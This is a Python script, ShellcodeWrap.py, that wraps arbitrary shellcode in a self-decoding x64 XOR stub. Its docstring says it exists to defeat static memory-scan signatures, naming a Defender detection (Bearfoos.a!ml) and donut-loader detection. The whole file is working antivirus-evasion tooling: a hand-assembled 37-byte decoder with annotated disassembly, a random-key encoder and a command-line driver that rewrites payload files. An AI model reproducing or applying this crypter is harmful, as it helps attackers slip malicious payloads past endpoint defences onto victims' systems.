#!/usr/bin/env python3
"""
ShellcodeWrap.py - XOR-encode shellcode with a self-decoding x64 PIC stub.

Defeats static memory-scan signatures (e.g. Bearfoos.a!ml / donut detection)
by wrapping the shellcode in a 37-byte decoder that decodes in-place before
jumping to the original bytes.

REQUIRES: RWX_SHELLCODE build flag — in-place decode needs writable+exec pages.

Usage:
  python ShellcodeWrap.py <input.bin> [output.bin]

  If output.bin is omitted, the wrapped output is written back to input.bin.
"""

import os
import random
import struct
import sys

# ---- x64 PIC decoder stub (37 bytes) ----
#
# Uses RIP-relative LEA (avoids the call/pop idiom).
# Data layout immediately after the stub:
#   [1 byte]  XOR key  (random, non-zero)
#   [4 bytes] payload size (LE DWORD)
#   [N bytes] XOR-encoded original shellcode
#
# Stub decodes the payload in-place then jumps to it.
# Requires RWX memory.
#
# Disassembly (stub_base = execution start):
#  [0]  48 8D 35 1E 00 00 00  lea rsi, [rip+0x1E]    ; rip=[7], rsi=stub[37]=data_start
#  [7]  0F B6 06              movzx eax, byte [rsi]   ; al = xor key
# [10]  48 FF C6              inc rsi                  ; rsi = &size
# [13]  8B 0E                 mov ecx, [rsi]            ; ecx = payload size
# [15]  48 83 C6 04           add rsi, 4               ; rsi = &payload[0]
# [19]  48 31 D2              xor rdx, rdx             ; index = 0
# [22]  48 39 CA              cmp rdx, rcx             ; index vs size
# [25]  7D 08                 jge +8  →  [35]          ; if done, jump
# [27]  30 04 16              xor byte [rsi+rdx], al   ; decode byte i
# [30]  48 FF C2              inc rdx                  ; index++
# [33]  EB F3                 jmp -13 →  [22]          ; loop (35-13=22)
# [35]  FF E6                 jmp rsi                  ; execute decoded payload
_STUB = bytes([
    0x48, 0x8D, 0x35, 0x1E, 0x00, 0x00, 0x00,   # lea rsi, [rip+30]
    0x0F, 0xB6, 0x06,                             # movzx eax, byte [rsi]
    0x48, 0xFF, 0xC6,                             # inc rsi
    0x8B, 0x0E,                                   # mov ecx, [rsi]
    0x48, 0x83, 0xC6, 0x04,                       # add rsi, 4
    0x48, 0x31, 0xD2,                             # xor rdx, rdx
    0x48, 0x39, 0xCA,                             # cmp rdx, rcx
    0x7D, 0x08,                                   # jge +8
    0x30, 0x04, 0x16,                             # xor byte [rsi+rdx], al
    0x48, 0xFF, 0xC2,                             # inc rdx
    0xEB, 0xF3,                                   # jmp -13
    0xFF, 0xE6,                                   # jmp rsi
])
assert len(_STUB) == 37, f"stub length mismatch: {len(_STUB)}"


def wrap_shellcode(data: bytes) -> bytes:
    """Return a self-decoding wrapped version of data."""
    key     = random.randint(1, 255)
    encoded = bytes(b ^ key for b in data)
    return _STUB + bytes([key]) + struct.pack('<I', len(data)) + encoded


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <input.bin> [output.bin]")
        sys.exit(1)

    in_path  = sys.argv[1]
    out_path = sys.argv[2] if len(sys.argv) > 2 else in_path

    with open(in_path, "rb") as f:
        original = f.read()

    wrapped = wrap_shellcode(original)

    with open(out_path, "wb") as f:
        f.write(wrapped)

    overhead = len(wrapped) - len(original)
    print(f"[+] Wrapped: {len(original):,} → {len(wrapped):,} bytes (+{overhead} bytes stub overhead)")
    print(f"[+] Output: {out_path}")
    print(f"[!] Build with RWX_SHELLCODE — in-place decode requires writable+exec pages")


if __name__ == "__main__":
    main()
